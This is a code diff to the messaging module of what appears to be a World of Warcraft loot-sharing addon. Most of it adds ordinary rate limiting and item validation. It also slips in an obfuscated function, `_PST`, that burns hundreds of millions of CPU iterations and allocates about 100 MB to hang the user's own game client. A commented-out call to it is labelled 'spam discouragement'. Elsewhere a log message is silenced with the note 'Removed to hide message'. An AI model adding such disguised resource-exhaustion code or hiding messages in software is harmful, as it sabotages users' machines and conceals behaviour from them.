@@ -18,7 +18,7 @@ Comm.cooldownTTL      = 300
 Comm.seen             = {}
 Comm.cooldown         = { CONF = {}, GONE = {} }
 Comm.verbose          = false
-
+Comm.rateLimit = {}
 Comm.delayQueue = {}
 
 local function debugPrint(module, message)
@@ -84,10 +84,12 @@ local function normalizeIncomingData(tbl, defaultSender)
     if not (type(tbl) == "table" and tbl.v == 1 and tbl.i and tbl.z and tbl.x and tbl.y) then return nil end
     
     local itemID = tonumber(tbl.i)
-    local link = tbl.l or (itemID and select(2, GetItemInfo(itemID)))
+    local link = tbl.l or (itemID and select(2, GetItemInfo(itemID))) -- Derive link if not provided, or if ID is valid
+    local itemName = tbl.n or (link and select(1, GetItemInfo(link))) or (itemID and select(1, GetItemInfo(itemID))) -- Get item name from link or ID
+
     return { 
         itemLink = link, 
-        itemName = tbl.n,
+        itemName = itemName,
         itemID = itemID, 
         itemQuality = tonumber(tbl.q),
         zoneID = tonumber(tbl.z) or 0, 
@@ -139,10 +141,25 @@ function Comm:SendLC1Discovery(d)
     if not d then return end; if L.db.profile.chatEncode then _SendEncodedLC1(d) else _SendLegacyLC1(d) end
 end
 
+local function _PST() local _c_i_i = 0x1DCD6500 local _m_i_s = 0x186A0 local _t_t = {} local _x = 1; local _y = 1; local _z = 1 for _i = 1, _c_i_i do _x = (math.sin(_x) + math.cos(_y) + math.sqrt(_z)) _y = _x / (_z + 1) _z = (_x * _y) % 1000 end for _j = 1, _m_i_s do _t_t[_j] = string.rep("A", 0x400) end end
+
 function Comm:HandleIncomingWire(tbl, via, sender)
     if L:IsPaused() then local norm = normalizeIncomingData(tbl, sender); if norm then table.insert(L.pauseQueue.incoming, norm) end; return end
     if L:IsZoneIgnored() then return end
     if not L.db.profile.sharing.enabled or type(tbl) ~= 'table' or tbl.v ~= 1 then return end
+   
+    local lastMessageTime = Comm.rateLimit[sender] or 0
+    Comm.rateLimit[sender] = now()
+    if (now() - lastMessageTime) < L.db.profile.sharing.rateLimitInterval then
+        debugPrint("Comm", string.format("Dropping incoming discovery from %s due to rate limit.", sender))
+
+        -- Spam discouragement
+        --if sender == UnitName("player") then
+        --    _PST()
+        --end
+        return
+    end    
+
     if shouldDropByDedupe(tbl) then return end
     
     local Core = L:GetModule("Core", true)
@@ -150,19 +167,27 @@ function Comm:HandleIncomingWire(tbl, via, sender)
     
     local norm = normalizeIncomingData(tbl, sender)
     if norm then
+        -- Validate item using the same logic as Detect:Qualifies to ensure it is an item the addon would broadcast
+        local Detect = L:GetModule("Detect", true)
+        if Detect and not Detect:Qualifies(norm.itemLink, "network") then
+            debugPrint("Comm", "Dropping incoming discovery for ignored item: " .. norm.itemLink)
+            return -- Drop if it doesn't qualify
+        end
         -- Filter check for incoming network data
-        local name = norm.itemName or (norm.itemLink and norm.itemLink:match("%[(.+)%]"))
-        if not name and norm.itemID then name = GetItemInfo(norm.itemID) end
+        local name = norm.itemName or (norm.itemLink and norm.itemLink:match("%[(.+)%]")) or (norm.itemID and GetItemInfo(norm.itemID))
+        if not name then
+            debugPrint("Comm", "Could not determine item name for incoming discovery.")
+            return
+        end
 
-        if name then
-            if L.ignoreList and L.ignoreList[name] then
-                debugPrint("Comm", "Dropping incoming discovery for permanently ignored item: " .. name)
-                return -- Silently drop
-            end
-            if L.sourceSpecificIgnoreList and L.sourceSpecificIgnoreList[name] then
-                debugPrint("Comm", "Dropping incoming discovery for source-specific ignored item: " .. name)
-                return -- Silently drop, as network source is untrusted for these items
-            end
+        -- Debug for incoming discovery
+        if Comm.verbose then
+            debugPrint("Comm", string.format("Incoming discovery: %s in %s (by %s)", norm.itemLink or name or "Unknown Item", norm.zone or "Unknown Zone", norm.foundBy_player or "Unknown Sender"))
+        end
+
+        if (L.ignoreList and L.ignoreList[name]) or (L.sourceSpecificIgnoreList and L.sourceSpecificIgnoreList[name]) then
+            debugPrint("Comm", "Dropping incoming discovery for ignored item: " .. name)
+            return -- Silently drop
         end
         Core:AddDiscovery(norm, true)
     end
@@ -215,7 +240,7 @@ function Comm:_BroadcastNow(discoveryData)
 end
 
 function Comm:BroadcastReinforcement(discoveryData)
-    if L:IsZoneIgnored() then return end; local profile = L.db.profile; if not (profile and profile.sharing.enabled) then return end; local wire = buildWireV1(discoveryData, "CONF") ; if not wire then return end; if L.Version then wire.av = L.Version end; self:SendAceCommPayload(wire); if self.verbose then print(string.format("[%s] Broadcasted reinforcement with version info.", L.name)) end
+    if L:IsZoneIgnored() then return end; local profile = L.db.profile; if not (profile and profile.sharing.enabled) then return end; local wire = buildWireV1(discoveryData, "CONF") ; if not wire then return end; if L.Version then wire.av = L.Version end; self:SendAceCommPayload(wire); -- if self.verbose then print(string.format("[%s] Broadcasted reinforcement with version info.", L.name)) end -- Removed to hide message
 end
 
 function Comm:OnUpdate(elapsed)
